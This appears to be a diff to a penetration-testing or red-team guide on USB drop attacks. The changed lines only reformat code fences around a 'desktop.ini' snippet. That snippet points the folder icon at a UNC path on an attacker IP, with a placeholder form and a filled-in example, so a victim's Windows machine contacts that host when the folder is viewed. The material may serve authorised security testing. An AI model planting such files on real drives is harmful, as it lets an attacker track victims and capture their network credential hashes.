@@ -349,12 +349,14 @@ File Preparation
 
 - Create a file titled “desktop.ini”
 - Place the below code in the file  
-``` [.ShellClassInfo]
+```
+[.ShellClassInfo]
 IconResource=\\<ATTACKING_IP>\<TARGET_COMPANY>?usb=<USB_DESCRIPTION>.ico,0
 ```
   
 Example  
-``` [.ShellClassInfo]
+```
+[.ShellClassInfo]
 IconResource=\\1.2.3.4\Google?usb=LimeGreen.ico,0
 ```
 
